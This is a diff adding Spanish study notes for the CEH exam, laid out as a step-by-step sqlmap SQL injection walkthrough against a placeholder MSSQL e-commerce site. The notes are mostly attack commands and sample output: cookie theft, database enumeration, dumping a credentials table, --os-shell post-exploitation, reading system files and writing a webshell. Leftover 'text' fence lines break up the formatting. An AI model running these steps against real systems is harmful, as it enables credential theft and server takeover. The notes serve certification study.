@@ -1393,7 +1393,177 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jw
 TASKLIST
 help
 ```
+# 🗃️ Apuntes: SQL Injection con SQLMAP contra MSSQL
 
+## 🎯 Ataque SQL Injection Completo usando SQLMAP
+
+### **Paso 1: Preparación - Obtener Cookie**
+1. Navegar a `http://example-ecommerce.com` y hacer login
+2. Ir a "View Profile" o página vulnerable
+3. **F12** → **Console** → escribir `document.cookie`
+4. Copiar el valor de la cookie completa
+
+---
+
+### **Paso 2: Enumerar Bases de Datos**
+sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
+--cookie="SESSIONID=abc123; AUTH=xyz789" --dbs
+
+text
+
+**Ejemplo de salida esperada:**
+[] ecommerce_db
+[] master
+[] tempdb
+[] model
+
+text
+
+---
+
+### **Paso 3: Enumerar Tablas de BD Específica**
+sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
+--cookie="SESSIONID=abc123; AUTH=xyz789" -D ecommerce_db --tables
+
+text
+
+**Ejemplo de salida:**
+[] customers
+[] products
+[] user_accounts
+[] orders
+
+text
+
+---
+
+### **Paso 4: Obtener Columnas de Tabla Específica**
+sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
+--cookie="SESSIONID=abc123; AUTH=xyz789"
+-D ecommerce_db -T user_accounts --columns
+
+text
+
+**Ejemplo de salida:**
+[] id (int)
+[] username (varchar)
+[] password (varchar)
+[] email (varchar)
+[*] role (varchar)
+
+text
+
+---
+
+### **Paso 5: Extraer Datos de la Tabla**
+sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
+--cookie="SESSIONID=abc123; AUTH=xyz789"
+-D ecommerce_db -T user_accounts --dump
+
+text
+
+**Ejemplo de datos extraídos:**
++----+----------+------------------+-------------------+-------+
+| id | username | password | email | role |
++----+----------+------------------+-------------------+-------+
+| 1 | admin | 5f4dcc3b5aa765d6 | admin@example.com | admin |
+| 2 | johndoe | 098f6bcd4621d373 | john@example.com | user |
++----+----------+------------------+-------------------+-------+
+
+text
+
+---
+
+### **Paso 6: Obtener Shell del Sistema Operativo**
+sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
+--cookie="SESSIONID=abc123; AUTH=xyz789" --os-shell
+
+text
+
+**Responder "Y" a:** `optimize value(s) for DBMS delay responses`
+
+---
+
+### **Paso 7: Comandos Post-Explotación en OS Shell**
+Una vez dentro del shell:
+hostname # Nombre del servidor
+ipconfig # Configuración de red
+whoami # Usuario actual
+dir C:\ # Listar directorio raíz
+net user # Usuarios del sistema
+systeminfo # Información del sistema
+
+text
+
+---
+
+## 🛠️ Opciones Adicionales Útiles de SQLMAP
+
+### **Para diferentes tipos de payload:**
+Time-based blind
+sqlmap -u "URL" --cookie="COOKIE" --technique=T
+
+Boolean-based blind
+sqlmap -u "URL" --cookie="COOKIE" --technique=B
+
+Union-based
+sqlmap -u "URL" --cookie="COOKIE" --technique=U
+
+Error-based
+sqlmap -u "URL" --cookie="COOKIE" --technique=E
+
+text
+
+### **Para especificar DBMS:**
+sqlmap -u "URL" --cookie="COOKIE" --dbms=mssql
+
+text
+
+### **Para usar proxy (como Burp):**
+sqlmap -u "URL" --cookie="COOKIE" --proxy="http://127.0.0.1:8080"
+
+text
+
+---
+
+## 📝 Comandos de Reconocimiento Avanzado
+
+### **Obtener información del DBMS:**
+sqlmap -u "URL" --cookie="COOKIE" --banner
+sqlmap -u "URL" --cookie="COOKIE" --current-user
+sqlmap -u "URL" --cookie="COOKIE" --current-db
+sqlmap -u "URL" --cookie="COOKIE" --privileges
+
+text
+
+### **Leer archivos del sistema:**
+sqlmap -u "URL" --cookie="COOKIE" --file-read="C:\Windows\System32\drivers\etc\hosts"
+
+text
+
+### **Escribir archivos (webshell):**
+sqlmap -u "URL" --cookie="COOKIE" --file-write="shell.aspx" --file-dest="C:\inetpub\wwwroot\shell.aspx"
+
+text
+
+---
+
+## 💡 Tips para Examen CEH
+
+### **Flujo recomendado:**
+1. **Identificar parámetro vulnerable** (id=1, user=admin, etc.)
+2. **Obtener cookie de sesión autenticada** si es necesario
+3. **Enumerar de general a específico**: `--dbs` → `--tables` → `--columns` → `--dump`
+4. **Intentar obtener shell** con `--os-shell`
+5. **Explorar sistema** con comandos de reconocimiento
+
+### **Errores comunes a evitar:**
+- No copiar toda la cookie (incluir todos los valores)
+- No usar comillas correctas en la URL
+- No responder "Y" a las optimizaciones de sqlmap
+- No verificar si la URL es vulnerable antes de enumerar
+
+---
 ---
 
 ## 3. Comandos MySQL
